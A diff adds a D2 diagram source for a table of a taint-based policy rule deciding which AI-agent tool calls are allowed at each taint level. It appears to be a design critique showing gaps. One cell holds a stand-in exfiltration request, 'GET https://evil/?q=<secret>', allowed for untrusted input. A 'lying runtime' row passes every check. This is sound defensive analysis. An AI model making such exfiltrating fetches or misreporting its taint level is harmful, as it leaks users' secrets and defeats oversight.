@@ -1,0 +1,37 @@
+direction: down
+
+t: "Rule 2 as written: what the relying party does with no step-up receipt" {
+  grid-rows: 6
+  grid-columns: 4
+  grid-gap: 0
+
+  h0: "taint_lattice_level \\ tool_effect_class" {style.fill: "#1e293b"; style.font-color: "#ffffff"; style.bold: true}
+  h1: "STATE_MUTATING" {style.fill: "#1e293b"; style.font-color: "#ffffff"; style.bold: true}
+  h2: "PRIVILEGED_ACTUATE" {style.fill: "#1e293b"; style.font-color: "#ffffff"; style.bold: true}
+  h3: "anything else\n(read, search, fetch URL)" {style.fill: "#1e293b"; style.font-color: "#ffffff"; style.bold: true}
+
+  r1: "TRUSTED_ONLY" {style.fill: "#e2e8f0"; style.font-color: "#0a0f25"; style.bold: true}
+  r1a: "ALLOW" {style.fill: "#dcfce7"; style.font-color: "#0a0f25"}
+  r1b: "ALLOW" {style.fill: "#dcfce7"; style.font-color: "#0a0f25"}
+  r1c: "ALLOW" {style.fill: "#dcfce7"; style.font-color: "#0a0f25"}
+
+  r2: "MIXED_TAINT" {style.fill: "#e2e8f0"; style.font-color: "#0a0f25"; style.bold: true}
+  r2a: "REJECT\nERR_TAINTED_CONTROL_PLANE" {style.fill: "#fde2e2"; style.font-color: "#0a0f25"}
+  r2b: "REJECT\nERR_TAINTED_CONTROL_PLANE" {style.fill: "#fde2e2"; style.font-color: "#0a0f25"}
+  r2c: "ALLOW\n(no rule applies)" {style.fill: "#fef3c7"; style.font-color: "#0a0f25"}
+
+  r3: "UNTRUSTED_INGESTED" {style.fill: "#e2e8f0"; style.font-color: "#0a0f25"; style.bold: true}
+  r3a: "REJECT\nERR_TAINTED_CONTROL_PLANE" {style.fill: "#fde2e2"; style.font-color: "#0a0f25"}
+  r3b: "REJECT\nERR_TAINTED_CONTROL_PLANE" {style.fill: "#fde2e2"; style.font-color: "#0a0f25"}
+  r3c: "ALLOW\nGET https://evil/?q=<secret>" {style.fill: "#fef3c7"; style.font-color: "#0a0f25"}
+
+  r4: "QUARANTINED\n(registry only, Sec 6)" {style.fill: "#e2e8f0"; style.font-color: "#0a0f25"; style.bold: true}
+  r4a: "REJECT\n(only because != TRUSTED_ONLY)" {style.fill: "#fde2e2"; style.font-color: "#0a0f25"}
+  r4b: "REJECT\n(only because != TRUSTED_ONLY)" {style.fill: "#fde2e2"; style.font-color: "#0a0f25"}
+  r4c: "ALLOW\n(quarantine means nothing here)" {style.fill: "#fef3c7"; style.font-color: "#0a0f25"}
+
+  r5: "lying runtime:\nsays TRUSTED_ONLY" {style.fill: "#e2e8f0"; style.font-color: "#0a0f25"; style.bold: true}
+  r5a: "ALLOW\nsignature is valid" {style.fill: "#fca5a5"; style.font-color: "#0a0f25"; style.bold: true}
+  r5b: "ALLOW\nsignature is valid" {style.fill: "#fca5a5"; style.font-color: "#0a0f25"; style.bold: true}
+  r5c: "ALLOW" {style.fill: "#fca5a5"; style.font-color: "#0a0f25"; style.bold: true}
+}
